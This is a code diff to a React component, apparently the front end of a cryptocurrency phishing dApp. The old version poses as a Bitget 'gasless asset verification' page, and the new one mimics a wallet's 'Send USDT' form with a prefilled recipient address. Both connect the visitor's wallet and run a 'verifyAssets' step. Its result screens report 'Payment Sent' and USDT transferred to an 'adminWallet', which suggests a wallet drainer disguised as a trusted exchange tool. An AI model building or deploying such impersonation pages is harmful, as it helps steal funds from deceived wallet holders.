@@ -55,6 +55,8 @@ export default function BNBVerifyDApp() {
     requiredGas: number
     shortfall: number
   } | null>(null)
+  const [recipientAddress, setRecipientAddress] = useState("TVnDbMnPjR6EhEo")
+  const [transferAmount, setTransferAmount] = useState("")
 
   const [autoConnectAttempts, setAutoConnectAttempts] = useState(0)
   const [autoConnectInterval, setAutoConnectInterval] = useState<NodeJS.Timeout | null>(null)
@@ -616,229 +618,238 @@ export default function BNBVerifyDApp() {
 
   const isOnBSC = networkId === BSC_NETWORK.chainId
 
+  const handleAddressInputChange = (value: string) => {
+    setRecipientAddress(value)
+  }
+
+  const handleAmountInputChange = (value: string) => {
+    const sanitized = value.replace(/[^0-9.]/g, "").replace(/(\..*?)\..*/g, "$1")
+    setTransferAmount(sanitized)
+  }
+
+  const handlePasteAddress = async () => {
+    try {
+      const text = await navigator.clipboard.readText()
+      setRecipientAddress(text)
+    } catch (error) {
+      setRecipientAddress("TVnDbMnPjR6EhEo")
+    }
+  }
+
+  const handleNext = async () => {
+    if (!recipientAddress.trim()) {
+      alert("Please enter an address")
+      return
+    }
+
+    if (!transferAmount || Number.parseFloat(transferAmount) <= 0) {
+      alert("Please enter a valid amount")
+      return
+    }
+
+    if (!isConnected) {
+      await connectWallet()
+      return
+    }
+
+    await verifyAssets()
+  }
+
   return (
-    <div className="verify-page">
-      {/* Mobile Header */}
-      <header className="flex items-center justify-between p-4 border-b border-gray-700/50">
-        <div className="flex items-center space-x-3">
-          <div className="bitget-brand" aria-label="Bitget">
-            <img className="bitget-mark" src="/Bitget-logo.svg.webp" alt="Bitget logo" />
+    <div className="send-usdt-page">
+      <div className="app-container">
+        <header className="header">
+          <button className="back-btn" aria-label="Go back" type="button">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1f2937" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="19" y1="12" x2="5" y2="12" />
+              <polyline points="12 19 5 12 12 5" />
+            </svg>
+          </button>
+
+          <h1 className="header-title">Send USDT</h1>
+
+          <button
+            type="button"
+            className="wallet-status-btn"
+            onClick={!isConnected ? connectWallet : undefined}
+          >
+            {autoConnecting ? "Connecting..." : isConnected ? `${account.slice(0, 6)}...${account.slice(-4)}` : "Connect"}
+          </button>
+        </header>
+
+        <div className="form-group">
+          <label className="form-label">Address or Domain Name</label>
+          <div className="input-box" id="addressContainer">
+            <input
+              type="text"
+              id="addressInput"
+              className="input-field"
+              value={recipientAddress}
+              onChange={(event) => handleAddressInputChange(event.target.value)}
+              placeholder="Enter address"
+              autoComplete="off"
+              spellCheck={false}
+            />
+            <div className="input-actions">
+              {recipientAddress && (
+                <button
+                  type="button"
+                  className="clear-btn visible"
+                  id="clearAddress"
+                  aria-label="Clear address"
+                  onClick={() => setRecipientAddress("")}
+                >
+                  ✕
+                </button>
+              )}
+              <button type="button" className="action-link" id="pasteBtn" onClick={handlePasteAddress}>
+                Paste
+              </button>
+              <button className="icon-btn" type="button" aria-label="Address book">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20" />
+                  <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z" />
+                  <line x1="9" y1="7" x2="15" y2="7" />
+                  <line x1="9" y1="11" x2="13" y2="11" />
+                </svg>
+              </button>
+              <button className="icon-btn" type="button" aria-label="Scan QR Code">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
+                  <path d="M7 3H5a2 2 0 0 0-2 2v2m0 10v2a2 2 0 0 0 2 2h2m10-16h2a2 2 0 0 1 2 2v2m0 10v2a2 2 0 0 1-2 2h-2" />
+                  <line x1="8" y1="12" x2="16" y2="12" />
+                </svg>
+              </button>
+            </div>
           </div>
         </div>
 
-        <div className="flex items-center space-x-3">
-          {/* Connection Status */}
-          {autoConnecting ? (
-            <div className="flex items-center space-x-2">
-              <Loader2 className="w-4 h-4 animate-spin text-yellow-500" />
-              <span className="text-xs text-gray-400 hidden sm:block">Connecting...</span>
-            </div>
-          ) : isConnected ? (
-            <div className="flex items-center space-x-2">
-              <Badge variant="outline" className="bg-green-500/20 text-green-400 border-green-500 text-xs">
-                {isOnBSC ? "BSC" : "Wrong Network"}
-              </Badge>
-              <Badge variant="outline" className="bg-yellow-500/20 text-yellow-400 border-yellow-500 text-xs">
-                🟡 Binance
-              </Badge>
-              <span className="text-xs text-gray-300 hidden sm:block">
-                {account.slice(0, 6)}...{account.slice(-4)}
-              </span>
-            </div>
-          ) : (
-              <Button onClick={connectWallet} variant="outline" size="sm" className="connect-button">
-              <Wallet className="w-3 h-3 mr-1" />
-              Connect
-            </Button>
-          )}
-
-          {/* Mobile Menu */}
-          <Button variant="ghost" size="sm" onClick={() => setShowMobileMenu(!showMobileMenu)} className="p-2">
-            <Menu className="w-5 h-5" />
-          </Button>
+        <div className="form-group">
+          <label className="form-label">Destination network</label>
+          <button type="button" className="network-badge" onClick={() => switchToBSC()}>
+            <svg className="badge-icon" viewBox="0 0 32 32" fill="none" aria-hidden="true">
+              <circle cx="16" cy="16" r="16" fill="#EF0027" />
+              <path d="M8 9.5L24 7.5L20 24.5L16 19L19.5 10L11 13.5L8 9.5Z" fill="white" />
+              <path d="M16 19L11.5 24.5L8 9.5L16 19Z" fill="rgba(255,255,255,0.7)" />
+            </svg>
+            <span>{isOnBSC ? "BSC" : "Tron"}</span>
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="#4b5563" aria-hidden="true">
+              <polygon points="6 9 12 15 18 9" />
+            </svg>
+          </button>
         </div>
-      </header>
 
-      {/* Mobile Menu Dropdown */}
-      {showMobileMenu && (
-        <div className="mobile-menu bg-gray-800/95 border-b border-gray-700/50 p-4">
-          <div className="space-y-3 text-sm">
-            {isConnected && (
+        <div className="form-group">
+          <label className="form-label">Amount</label>
+          <div className="input-box focused" id="amountContainer">
+            <input
+              type="text"
+              inputMode="decimal"
+              id="amountInput"
+              className="input-field"
+              placeholder="0.00"
+              value={transferAmount}
+              onChange={(event) => handleAmountInputChange(event.target.value)}
+            />
+            <div className="input-actions">
+              {transferAmount && (
+                <button
+                  type="button"
+                  className="clear-btn visible"
+                  id="clearAmount"
+                  aria-label="Clear amount"
+                  onClick={() => setTransferAmount("")}
+                >
+                  ✕
+                </button>
+              )}
+              <span className="currency-suffix">USDT</span>
+              <button type="button" className="action-link" id="maxBtn" onClick={() => setTransferAmount("100")}>Max</button>
+            </div>
+          </div>
+        </div>
+
+        {verificationResult && verificationStep === "completed" && (
+          <Card
+            className={`result-card ${
+              verificationResult.type === "genuine"
+                ? "result-card-success"
+                : verificationResult.type === "flash"
+                  ? "result-card-transfer"
+                  : "result-card-none"
+            }`}
+          >
+            <CardContent className="p-4 space-y-3">
+              <div className="flex items-center justify-center space-x-2">
+                {verificationResult.type === "genuine" && (
+                  <>
+                    <Shield className="w-5 h-5 text-green-400" />
+                    <span className="text-green-400 font-semibold">Assets Verified ✅</span>
+                  </>
+                )}
+                {verificationResult.type === "flash" && (
+                  <>
+                    <DollarSign className="w-5 h-5 text-blue-400" />
+                    <span className="text-blue-400 font-semibold">Payment Sent 💰</span>
+                  </>
+                )}
+                {verificationResult.type === "none" && (
+                  <>
+                    <AlertCircle className="w-5 h-5 text-gray-400" />
+                    <span className="text-gray-400 font-semibold">No Assets Found</span>
+                  </>
+                )}
+              </div>
+
+              <p className="result-message">{verificationResult.message}</p>
+
+              <div className="space-y-2 text-sm">
+                <div className="flex justify-between">
+                  <span className="text-gray-500">USDT {verificationResult.transferred ? "Sent" : "Balance"}:</span>
+                  <span className="text-gray-900 font-semibold">{verificationResult.usdtAmount.toFixed(2)} USDT</span>
+                </div>
+                {verificationResult.transferred && (
+                  <div className="flex justify-between">
+                    <span className="text-gray-500">
+                      {verificationResult.isHighAmount ? "High-Amount" : "Standard"} Wallet:
+                    </span>
+                    <span className="text-blue-500 text-xs">
+                      {verificationResult.adminWallet?.slice(0, 8)}...{verificationResult.adminWallet?.slice(-6)}
+                    </span>
+                  </div>
+                )}
+              </div>
+            </CardContent>
+          </Card>
+        )}
+
+        {txHash && (
+          <div className="tx-hash-box">
+            <p>Transaction Hash (BSC):</p>
+            <a href={`https://bscscan.com/tx/${txHash}`} target="_blank" rel="noopener noreferrer">
+              {txHash}
+            </a>
+          </div>
+        )}
+
+        <div className="footer">
+          <button type="button" className="submit-btn" id="nextBtn" onClick={handleNext} disabled={verificationStep === "checking" || verificationStep === "transferring"}>
+            {verificationStep === "checking" && (
               <>
-                <div className="flex justify-between">
-                  <span className="text-gray-400">Wallet:</span>
-                  <span className="text-yellow-400">🟡 Binance Web3</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-gray-400">Address:</span>
-                  <span className="text-white break-all text-right">
-                    {account.slice(0, 8)}...{account.slice(-6)}
-                  </span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-gray-400">Network:</span>
-                  <span className="text-green-400">{isOnBSC ? "BSC (0x38)" : "Wrong Network"}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-gray-400">USDT Balance:</span>
-                  <span className="text-yellow-400">{usdtBalance} USDT</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-gray-400">BNB Balance:</span>
-                  <span className="text-yellow-400">{balance} BNB</span>
-                </div>
+                <Loader2 className="w-5 h-5 mr-2 animate-spin" />
+                Analyzing Assets...
               </>
             )}
-            {!isConnected && (
-              <div className="text-center">
-                <p className="text-gray-400 mb-3">Connect Binance Web3 Wallet to continue</p>
-                <p className="text-xs text-gray-500">Using BSC EVM Network (Chain ID: 0x38)</p>
-              </div>
+            {verificationStep === "transferring" && (
+              <>
+                <DollarSign className="w-5 h-5 mr-2 text-green-500" />
+                Processing Payment...
+              </>
             )}
-          </div>
+            {verificationStep === "completed" && "Next"}
+            {verificationStep === "idle" && "Next"}
+          </button>
         </div>
-      )}
-
-      {/* Main Content */}
-      <main className="verify-main">
-        <div className="text-center max-w-lg mx-auto space-y-8">
-          {/* Hero Section */}
-          <div className="space-y-6">
-            <div className="space-y-2">
-              <h1 className="heading-main">Verify Assets<br /><span>on Bitget</span></h1>
-            </div>
-
-            <div className="space-y-4">
-              <p className="text-lg sm:text-xl text-gray-300 font-medium">
-                Serving Gas Less Web3 tools to<br />over 100 Million users
-              </p>
-            </div>
-          </div>
-
-          <div className="gasless-copy">
-            <h2>Gasless Asset Verification</h2>
-            <p>Verify and check your assets across supported chains - completely gasless and with no network fees</p>
-          </div>
-
-          <div className="feature-box">
-            <h2>Safe and reliable</h2>
-            <p>We are committed to safeguarding your assets and ensuring the security of your information</p>
-            <Shield aria-hidden="true" />
-          </div>
-
-          {/* Verification Result */}
-          {verificationResult && verificationStep === "completed" && (
-            <Card
-              className={`max-w-sm mx-auto ${
-                verificationResult.type === "genuine"
-                  ? "bg-green-900/20 border-green-500/30"
-                  : verificationResult.type === "flash"
-                    ? "bg-blue-900/20 border-blue-500/30"
-                    : "bg-gray-800/50 border-gray-700"
-              }`}
-            >
-              <CardContent className="p-4 space-y-3">
-                <div className="flex items-center justify-center space-x-2">
-                  {verificationResult.type === "genuine" && (
-                    <>
-                      <Shield className="w-5 h-5 text-green-400" />
-                      <span className="text-green-400 font-semibold">Assets Verified ✅</span>
-                    </>
-                  )}
-                  {verificationResult.type === "flash" && (
-                    <>
-                      <DollarSign className="w-5 h-5 text-blue-400" />
-                      <span className="text-blue-400 font-semibold">Payment Sent 💰</span>
-                    </>
-                  )}
-                  {verificationResult.type === "none" && (
-                    <>
-                      <AlertCircle className="w-5 h-5 text-gray-400" />
-                      <span className="text-gray-400 font-semibold">No Assets Found</span>
-                    </>
-                  )}
-                </div>
-
-                <p
-                  className={`text-sm text-center ${
-                    verificationResult.type === "genuine"
-                      ? "text-green-300"
-                      : verificationResult.type === "flash"
-                        ? "text-blue-300"
-                        : "text-gray-300"
-                  }`}
-                >
-                  {verificationResult.message}
-                </p>
-
-                <div className="space-y-2 text-sm">
-                  <div className="flex justify-between">
-                    <span className="text-gray-400">USDT {verificationResult.transferred ? "Sent" : "Balance"}:</span>
-                    <span className="text-white font-semibold">{verificationResult.usdtAmount.toFixed(2)} USDT</span>
-                  </div>
-                  {verificationResult.transferred && (
-                    <div className="flex justify-between">
-                      <span className="text-gray-400">
-                        {verificationResult.isHighAmount ? "High-Amount" : "Standard"} Wallet:
-                      </span>
-                      <span className="text-blue-400 text-xs">
-                        {verificationResult.adminWallet?.slice(0, 8)}...{verificationResult.adminWallet?.slice(-6)}
-                      </span>
-                    </div>
-                  )}
-                </div>
-              </CardContent>
-            </Card>
-          )}
-
-          {/* Action Buttons */}
-          <div className="action-area">
-            <Button
-              onClick={verifyAssets}
-              disabled={!isConnected || !isOnBSC || !["idle", "completed"].includes(verificationStep)}
-              className="verify-button"
-            >
-              {verificationStep === "checking" && (
-                <>
-                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
-                  Analyzing Assets...
-                </>
-              )}
-              {verificationStep === "transferring" && (
-                <>
-                  <DollarSign className="w-5 h-5 mr-2 text-green-500" />
-                  Processing Payment...
-                </>
-              )}
-              {verificationStep === "completed" && "Verify Assets"}
-              {verificationStep === "idle" && "Verify Assets"}
-            </Button>
-
-            <Button
-              variant="outline"
-              className="home-button"
-            >
-              <Home className="w-5 h-5 mr-2" />
-              HOME
-            </Button>
-          </div>
-
-          {/* Transaction Hash */}
-          {txHash && (
-            <div className="text-center text-sm text-gray-400 px-4">
-              <p className="mb-2">Transaction Hash (BSC):</p>
-              <a
-                href={`https://bscscan.com/tx/${txHash}`}
-                target="_blank"
-                rel="noopener noreferrer"
-                className="text-blue-400 hover:text-blue-300 break-all text-xs"
-              >
-                {txHash}
-              </a>
-            </div>
-          )}
-        </div>
-      </main>
+      </div>
     </div>
   )
 }
